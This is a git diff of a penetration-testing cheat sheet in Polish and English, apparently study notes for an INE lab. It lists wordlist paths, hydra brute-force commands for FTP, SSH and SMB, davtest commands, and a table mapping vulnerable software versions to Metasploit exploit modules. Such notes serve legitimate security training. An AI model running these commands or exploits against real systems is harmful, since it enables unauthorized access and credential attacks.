@@ -7,55 +7,98 @@ jak robisz autoroute to daj na adres ip maszyny, do której się chcesz dostać,
 
 
 Lists:
+
 a)users:
+
 /usr/share/metasploit-framework/data/wordlists/common_users.txt
+
 /data/wordlists/unix_users.txt
+
 /usr/share/metasploit-framework/data/wordlists/namelist.txt
+
 /usr/share/wordlists/metasploit/unix_users.txt
+
 root
+
 vagrant
-search smtp_enum # pobranie userów po SMTP```````
+
+search smtp_enum # pobranie userów po SMTP
+
 
 b)passwords:
+
 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
 /usr/share/wordlists/metasploit/unix_passwords.txt
+
 /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+
 /usr/share/wordlists/rockyou.txt.gz
 
+
 c)for cracking:
+
 auxiliary/scanner/http/http_login
+
 http/dir_scanner
+
 auxiliary/scanner/winrm/winrm_login
 
+
 d)files, dirs:
+
 /usr/share/metasploit-framework/data/wordlists/directory.txt
 
 hydra fast commands:
+
 hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ip ftp
+
 hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt ip ssh
+
 hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb
 
 
+
 vulnerabilities:
+
 * jak nie mas pomysłu to są 3 opcje: wpisujesz wersje w gogle i słowa exploit lub cve | searchsploit wersja | moduł metasplota suggester czy jakoś tak
+  
 * jak masz exploita na daną wersje, ale nie działa to niekoniecznie robisz coś źle, być może został dany exploit załatany
+  
 linux - vsftpd v 2.3.4  -  exploit/unix/ftp/vsftpd_234_backdoor
+
 linux - proftpd 1.3.3c  -  proftpd_133c_backdoor
+
 linux - Haraka SMTP v2.8.9 i 2.8.8  -  exploit/linux/smtp/haraka
+
 linux - libssh v0.6.0-0.8.0 i 0.8.3  -  auxiliary/scanner/ssh/libssh_auth_bypass
+
 linux - Samba v3.5.0 / 3.0.20 (ogólnie smbd 3.5.0 to 4.4.14, 4.5.10, and 4.6.4)  -  exploit/……/is_known_pipename
+
 linux - samba 3.0.20  -  exploit/multi/samba/usermap_script
+
 windows - Apache Tomcat v8.5.19  -  exploit/multi/http/tomcat_jsp_upload_bypass
+
 windows - rejetto HttpFileServer 2.3 -  exploit/windows/http/rejetto_hfs_exec
+
 xoda web service  -  exploit/unix/webapp/xoda_file_upload
+
 linux priv esc  -  chkrootkit  0.49  -  exploit/unix/local/chkrootkit  (whereis chkrootkit)
+
 windows  -  badblue 2.7  -  exploit/windows/http/badblue_passthru
+
 Windows 2008 and 2008R2 - search eternalblue  -  ms17_010_eterenalblue (auxiliary/scanner/smb/smb_ms17_010 detection)
+
 PHP 5.4.2 versions below - CGI plik - shellshock  -  exploit/multi/http/php_cgi_arg_injection | apache_mod_chi_bash_env_exec 
+
 /phpinfo.php - 5.2.4ubuntu5.10 lub CGI | exploit/multi/http/php_cgi_arg_injection
+
 WebDAV | davtest -url http://10.0.17.27/webdav | davtest -auth bob:password_123321 -url http://10.0.17.27/webdav | exploit/windows/iis/iis_webdav_upload_asp
+
 ProcessMaker HTTP -  exploit/multi/http/process_maker_exec
+
 5985 port | WinRM - winrm_script_exec | auxiliary/scanner/winrm/winrm_login
+
 
 
 webshells, reverse shells:
